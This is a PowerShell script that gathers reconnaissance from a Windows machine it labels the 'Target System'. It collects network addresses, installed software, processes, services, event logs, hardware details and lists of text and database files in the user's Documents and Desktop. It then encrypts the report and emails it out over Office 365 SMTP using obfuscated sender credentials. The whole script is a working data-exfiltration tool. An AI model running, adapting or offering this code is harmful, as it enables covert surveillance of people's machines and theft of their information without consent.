$smtpServer = "smtp.office365.com"
$smtpPort = 587
$receiveAddr = ""
$subject = "Target System Info Report - $(hostname) - $(Get-Date -Format 'dd-MM-yyyy HH:mm:ss')"

#Encrypted credentials (encrypted with base64 from the encrypt script)
$encryptedEmail = ""
$encryptedPass = ""

#AES key and IV (encrypted with base64 from the encrypt script)
$keyBase64 = ""
$ivBase64 = ""

function DecryptCredentials {
    param (
        [string]$encryptedBase64,
        [byte[]]$key,
        [byte[]]$iv
    )
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $key
    $aes.IV = $iv
    $decryptor = $aes.CreateDecryptor()
    $encryptedBytes = [Convert]::FromBase64String($encryptedBase64)
    $decryptedBytes = $decryptor.TransformFinalBlock($encryptedBytes, 0, $encryptedBytes.Length)
    return [Text.Encoding]::UTF8.GetString($decryptedBytes)
}

#Decode key and IV
$key = [Convert]::FromBase64String($keyBase64)
$iv = [Convert]::FromBase64String($ivBase64)

#Decrypt credentials
$smtpSendAddr = DecryptCredentials -encryptedBase64 $encryptedEmail -key $key -iv $iv
$smtpSendPassPlain = DecryptCredentials -encryptedBase64 $encryptedPass -key $key -iv $iv

#Convert password to secure string
$smtpSendPass = ConvertTo-SecureString $smtpSendPassPlain -AsPlainText -Force

try {
    #Collect system info
    $ip = (Get-NetIPAddress | Where-Object { $_.AddressFamily -eq "IPv4" -and $_.IPAddress -notlike "169.*" }) | Select-Object IPAddress, InterfaceAlias
    $adapters = Get-NetAdapter | Select-Object Name, Status, MacAddress
    $installedApps = Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate
    $importantFiles = Get-ChildItem -Path "$env:USERPROFILE\Documents","$env:USERPROFILE\Desktop" -Recurse -Include *.txt, *.db, *.sqlite -ErrorAction SilentlyContinue | Select-Object FullName, Length, LastWriteTime
    $processes = Get-Process | Select-Object Name, Id, CPU, StartTime -ErrorAction SilentlyContinue
    $services = Get-Service | Where-Object { $_.Status -eq "Running" } | Select-Object Name, DisplayName, Status
    $events = Get-WinEvent -FilterHashtable @{LogName="System"; StartTime=(Get-Date).AddDays(-1)} -MaxEvents 50 | Select-Object TimeCreated, Id, LevelDisplayName, Message
    $hardware = Get-CimInstance Win32_ComputerSystem | Select-Object Manufacturer, Model, TotalPhysicalMemory

    #Create report
    $report = @()
    $report += "! IP Addresses !"
    $ip | ForEach-Object { $report += "$($_.InterfaceAlias): $($_.IPAddress)" }
    $report += ""
    $report += "! Network Adapters !"
    $adapters | ForEach-Object { $report += "$($_.Name) - Status: $($_.Status) - MAC: $($_.MacAddress)" }
    $report += ""
    $report += "! Installed Apps !"
    $installedApps | Where-Object { $_.DisplayName } | ForEach-Object { $report += "$($_.DisplayName) - Version: $($_.DisplayVersion) - Publisher: $($_.Publisher) - Installed At: $($_.InstallDate)" }
    $report += ""
    $report += "! Important Files !"
    $importantFiles | ForEach-Object { $report += "$($_.FullName) - Size: $($_.Length) bytes - Modified: $($_.LastWriteTime)" }
    $report += ""
    $report += "! Running Processes !"
    $processes | ForEach-Object { $report += "$($_.Name) (PID: $($_.Id)) - CPU: $($_.CPU) - Started: $($_.StartTime)" }
    $report += ""
    $report += "! Running Services !"
    $services | ForEach-Object { $report += "$($_.DisplayName) ($($_.Name)) - Status: $($_.Status)" }
    $report += ""
    $report += "! System Event Logs !"
    $events | ForEach-Object { $report += "$($_.TimeCreated) - ID: $($_.Id) - Level: $($_.LevelDisplayName) - $($_.Message)" }
    $report += ""
    $report += "! Hardware Info !"
    $hardware | ForEach-Object { $report += "Manufacturer: $($_.Manufacturer), Model: $($_.Model), RAM: $([Math]::Round($_.TotalPhysicalMemory / 1GB, 2)) GB" }

    #Convert report to string
    $reportText = $report -join "`r`n"

    #Encrypt report
    $aesReport = [System.Security.Cryptography.Aes]::Create()
    $aesReport.KeySize = 256
    $aesReport.GenerateKey()
    $aesReport.GenerateIV()

    $encryptor = $aesReport.CreateEncryptor()
    $reportBytes = [Text.Encoding]::UTF8.GetBytes($reportText)
    $encryptedBytes = $encryptor.TransformFinalBlock($reportBytes, 0, $reportBytes.Length)

    #Convert encrypted data and keys to base64 for email
    $encryptedReport = [Convert]::ToBase64String($encryptedBytes)
    $keyBase64Report = [Convert]::ToBase64String($aesReport.Key)
    $ivBase64Report = [Convert]::ToBase64String($aesReport.IV)

    #Prepare email body with encrypted report and keys
    $body = @"
Encrypted Report:
$encryptedReport

Encryption Key (Base64):
$keyBase64Report

Initialization Vector (Base64):
$ivBase64Report

Use Encryption Key and IV to decrypt the report.
"@

    #Create SMTP client and send mail
    $creds = New-Object System.Management.Automation.PSCredential ($smtpSendAddr, $smtpSendPass)

    $message = New-Object System.Net.Mail.MailMessage
    $message.From = $smtpSendAddr
    $message.To.Add($receiveAddr)
    $message.Subject = $subject
    $message.Body = $body

    $smtp = New-Object Net.Mail.SmtpClient($smtpServer, $smtpPort)
    $smtp.EnableSsl = $true
    $smtp.Credentials = $creds
    $smtp.Send($message)

    Write-Output "Email sent successfully."
} catch {
    Write-Error "Failed to send email: $_"
}